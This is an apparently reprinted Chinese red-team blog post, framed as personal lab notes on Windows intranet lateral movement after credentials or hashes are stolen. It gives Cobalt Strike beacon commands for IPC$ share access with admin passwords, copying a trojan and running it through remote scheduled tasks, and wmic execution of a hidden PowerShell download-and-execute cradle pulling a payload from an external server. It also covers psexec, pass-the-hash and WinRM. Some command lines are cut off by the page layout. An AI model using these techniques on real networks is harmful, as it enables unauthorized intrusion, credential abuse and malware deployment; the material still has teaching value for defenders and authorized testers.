2020/7/27 内⽹横向移动学习备忘录
内⽹横向移动学习备忘录
原创 队员编号032 酒仙桥六号部队 7⽉6⽇
这是 酒仙桥六号部队 的第 32 篇⽂章。
全⽂共计2001个字，预计阅读时⻓8分钟。
00 前⾔
针对于内⽹渗透个⼈理解为信息收集（内部⽹段的扫描、端⼝服务、操作系统、补丁更
新、域机器及重要业务机器定位、杀毒软件、防⽕墙策略、密码的规则、内部敏感⽂档
等）然后根据获取到的信息来绘画出内部的⽹络结构和内⽹脆弱点从⽽进⾏横向渗透。
本篇⽂章记载了当拿到内⽹机器的密码或Hash进⾏横向移动的⽅式。
01 环境介绍
1.1 扩展图
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 1/20
2020/7/27 内⽹横向移动学习备忘录
1.2 ⽹络环境
Windows 7 跳版机（192.168.200.222、10.211.66.5）双⽹卡可出⽹也可与内⽹连
通。 Windows server 2012 ⽬标靶机（192.168.200.66）不可出⽹。
1.3 简述
攻击者通过渗透测试拿到主机Win 7(192.168.200.222)的权限并发现可出⽹，所以上
线CS⽤来权限维持。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 2/20
2020/7/27 内⽹横向移动学习备忘录
前提我们已经抓取到Win 7(192.168.200.222)跳板机的登陆明⽂凭证，这⾥是我添加
的明⽂凭证，窃取凭证的⽅法有很多这⾥不在赘述参考⽂章，此篇⽂章只记录个⼈在学
习内⽹环境下横向移动的⼀些笔记。
添加⼀个 Win 7(192.168.200.222)跳板机的监听器⽤来做中转会话。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 3/20
2020/7/27 内⽹横向移动学习备忘录
⽣成⽊⻢⽂件在本地。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 4/20
2020/7/27 内⽹横向移动学习备忘录
Tips：因为Win 2012(192.168.200.66)⽬标机不出外⽹所以选择刚添加的中转会
话。
02 IPC$ && 计划任务
2.1 利⽤条件
1）没有禁⽤IPC$连接、139和445端⼝、未使⽤防⽕墙等⽅式来阻⽌IPC$。
2）⽬标机器开启了相关的IPC$服务。
3）需要⽬标机器的管理员账号和密码（IPC$空连接除外）。
4）需要得知⽬标机器IP地址并可互相通信。
2.2 利⽤⽅式
在 CS 客户端对Win 7(192.168.200.222)会话进⾏操作。
对 Win 2012(192.168.200.66)⽬标主机建⽴共享连接，并查看⽬标主机共享资源。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 5/20
2020/7/27 内⽹横向移动学习备忘录
1 beacon> shell net use \\192.168.200.66 /user:administrator "Hacker@1."
2 beacon> shell net view \\192.168.200.66
列出⽬标主机 C 盘下⽬录⽂件。
1 beacon> shell dir \\192.168.200.66\C$
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 6/20
2020/7/27 内⽹横向移动学习备忘录
将CS⽊⻢上传到跳板机。
1 beacon> upload /root/demo.exe (C:\Users\ppbibo\AppData\Local\Temp\demo.ex
将Win 7(192.168.200.222)跳板机的⽊⻢⽂件copy到Win 2012(192.168.200.66)
⽬标机的C共享盘下。
1 beacon> shell copy C:\Users\ppbibo\AppData\Local\Temp\demo.exe \\192.168.
远程创建Win 2012(192.168.200.66)⽬标机计划任务执⾏⽊⻢⽂件。
1 beacon> shell schtasks /create /s 192.168.200.66 /u administrator /p "Hac
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 7/20
2020/7/27 内⽹横向移动学习备忘录
由于 at 在windows server 2012等新版系统中已被弃⽤，所以需要使⽤ schtasks
命令代替。
如果⽬标机器⽀持 at 命令，参考如下。
1 net time \\192.168.200.66
2 at \\192.168.200.66 11:05 c:\demo.exe
成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会
断掉。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 8/20
2020/7/27 内⽹横向移动学习备忘录
2.3 IPC 相关的命令
开放/关闭 ipc$ 共享。
1 net share ipc$
2 net share ipc$ /del
共享计算机 C 盘。
1 net share C=c:\
查看/删除共享的资源。
1 net share
2 net share C /del
取消IPC远程连接。
1 net use * /del /y
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 9/20
2020/7/27 内⽹横向移动学习备忘录
03 WMI
WMI(Windows Management Instrumentation，Windows管理规范)是⼀项
核⼼的Windows管理技术；⽤户可以使⽤WMI管理本地和远程计算机。
3.1 利⽤条件
1）启动WMI服务（默认开启）。
2）开放135端⼝。
3.2 利⽤⽅式
在 CS 客户端对Win 7(192.168.200.222)会话进⾏操作。
使⽤CS⽣成⼀个WEB交互式Payload（Scripted Web Delivery）来实现⽆⽂件落
地上线。
⽣成的 Payload。
1 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloa
在CS 客户端执⾏ wmic 远程命令。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 10/20
2020/7/27 内⽹横向移动学习备忘录
Tips：因为⽬标主机不出⽹所以需要把 http://39.100.x.x:7799/a 上的payload，复
制下来并在跳板机开启WEB服务，使受害机下载并执⾏跳板机上的Payload，上线
CS。
跳板机安装了 python 运⾏如下命令快速开启WEB服务。
1 beacon> shell python -m SimpleHTTPServer 8080
1 beacon> shell wmic /node:192.168.200.66/user:administrator /password:Hack
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 11/20
2020/7/27 内⽹横向移动学习备忘录
成功上线。
在 windows server 2012 验证。
Tips：wmic命令缺点⽆回显，但是可借助其他脚本(wmiexec.vbs)来实现回显功能。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 12/20
2020/7/27 内⽹横向移动学习备忘录
04 PsExec
PsExec是⼀种轻巧的telnet替代品，可让您在其他系统上执⾏进程，并为控制台
应⽤程序提供完整的交互性，⽽⽆需⼿动安装客户端软件。
1 beacon> shell psexec.exe \\192.168.200.66 -u Administrator -p Hacker@1. w
1 beacon> shell psexec.exe \\192.168.200.66 -u Administrator -p Hacker@1. p
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 13/20
2020/7/27 内⽹横向移动学习备忘录
Tips：psexec 传递命令时不要添加双引号否则会报 “系统找不到指定的⽂件” 的错
误。
Psexec下载地址：
https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
更多参考：
https://www.itprotoday.com/compute-engines/psexec
4.1 CS Psexec_psh hash传递
凭证窃取中并不是每次都可以获取到明⽂，会出现只有hash的情况，获取hash同样可
以进⾏横向操作。
因为换了WiFi地址所有IP发⽣了如下变化。
Windows 7 跳版机（172.16.100.176、10.211.66.5）双⽹卡可出⽹也可与内⽹连
通。 Windows server 2012 ⽬标靶机（172.16.100.60）不可出⽹。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 14/20
2020/7/27 内⽹横向移动学习备忘录
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 15/20
2020/7/27 内⽹横向移动学习备忘录
成功上线。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 16/20
2020/7/27 内⽹横向移动学习备忘录
05 WinRM
WinRM 指 的 是 Windows 远 程 管 理 服 务 ， 通 过 远 程 连 接 winRM 模 块 可 以 操 作
windows命令⾏，默认监听端⼝5985（HTTP）&5986 (HTTPS)，在2012及以
后默认开启。
这 ⾥ 的 ⽬ 标 靶 机 正 好 是 windows server 2012 ， 运 ⾏ 如 下 命 令 查 看 是 否 启 ⽤ 了
winrm service 。
1 winrm enumerate winrm/config/listener
5.1 利⽤⽅式
CS⾃带了⼀些⽤于横向移动的功能，可以在⽬标中选中主机进⾏攻击。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 17/20
2020/7/27 内⽹横向移动学习备忘录
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 18/20
2020/7/27 内⽹横向移动学习备忘录
成功上线。
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 19/20
2020/7/27 内⽹横向移动学习备忘录
https://mp.weixin.qq.com/s/iwZtY-tToNRQYRi_qRQwjg 20/20